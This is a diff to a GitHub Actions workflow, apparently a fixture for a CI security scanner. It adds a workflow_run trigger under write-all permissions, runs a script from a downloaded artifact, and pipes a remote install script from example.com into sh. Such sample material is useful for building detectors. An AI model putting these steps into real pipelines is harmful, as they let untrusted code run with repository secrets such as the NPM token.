@@ -45,6 +45,9 @@ on:
     types: [opened]
   issue_comment:
     types: [created]
+  workflow_run:
+    workflows: [ci]
+    types: [completed]
 permissions: write-all
 jobs:
   build:
@@ -63,6 +66,11 @@ jobs:
         env:
           NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
         run: npm publish
+      - uses: actions/download-artifact@v4
+        with:
+          path: out
+      - run: bash out/run.sh
+      - run: curl -fsSL https://example.com/install.sh | sh
 """
 
 
